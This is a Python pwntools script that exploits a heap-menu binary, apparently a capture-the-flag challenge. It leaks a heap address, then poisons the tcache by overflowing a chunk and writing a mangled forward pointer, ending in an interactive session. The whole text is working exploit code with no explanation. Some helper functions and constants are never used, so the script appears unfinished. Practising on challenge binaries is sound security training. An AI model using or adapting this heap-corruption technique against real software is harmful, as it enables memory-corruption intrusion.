#!/bin/python 

from pwn import *
import sys

BUFFER_OFF = 0x118
GOAL = "win"

def get_leak():
    proc.recvuntil(b"[LEAK]")
    proc.recvuntil(b": ")
    return int(proc.recvline(drop=True)[:-1], 16)


def malloc(idx, size):
    proc.sendline(b"malloc")
    proc.sendline(str(idx))
    proc.sendline(str(size))


def free(idx):
    proc.sendline(b"free")
    proc.sendline(str(idx))


def scanf(idx, contents: bytes):
    proc.sendline(b"safe_read")
    proc.sendline(str(idx))
    proc.sendline(contents)


def puts(idx):
    proc.sendline(b"safe_write")
    proc.clean()
    proc.sendline(str(idx))

    proc.recvuntil(b"safe_write")
    proc.recvline()
    return proc.recvline(drop=True)


bin_idx = 1
def overwrite_next(contents: bytes):
    global bin_idx

    malloc(14, bin_idx)
    malloc(15, bin_idx)
    bin_idx *= 16

    free(15)
    free(14)

    scanf(14, contents)


def tcache_get_two_entries(bin):
    malloc(14, bin)
    malloc(15, bin)
    free(15)
    free(14)


def get_addr_num(addr: bytes):
    return u64(addr.ljust(8, b'\x00'))


FLAG_ALLOC_SIZE = 0x399
size = (( FLAG_ALLOC_SIZE + 0x10 * 2 ) & 0xFFF0) - 8
proc = process(sys.argv[1])

malloc(0, size)
malloc(1, size)
malloc(2, size)

free(1)
malloc(1, size)
heap_leak = get_addr_num(puts(1)[:8])
print("[$] heap leak: " + hex(heap_leak))

free(2)
free(1)
scanf(0, cyclic(size+8) + p64((heap_leak * (16 ** 3) + 0x670) ^ heap_leak))
malloc(5, size)

proc.interactive()
